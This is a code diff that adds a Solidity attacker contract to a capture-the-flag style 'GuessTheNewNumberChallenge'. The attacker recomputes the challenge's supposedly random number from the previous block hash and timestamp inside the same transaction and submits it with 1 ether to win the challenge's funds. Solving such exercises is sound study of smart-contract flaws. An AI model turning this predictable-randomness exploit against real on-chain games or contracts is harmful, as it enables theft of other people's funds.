@@ -18,3 +18,21 @@ contract GuessTheNewNumberChallenge {
         }
     }
 }
+
+interface IGuessTheNewNumber {
+    function guess(uint8 n) external payable;
+}
+
+contract GuessTheNewNumberAttacker {
+    function attack(address challengeAddress) external payable {
+        require(msg.value == 1 ether);
+        
+        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
+        
+
+        IGuessTheNewNumber(challengeAddress).guess.value(1 ether)(answer);
+
+    }
+    
+    function() public payable {} // Fallback to receive ETH
+}  
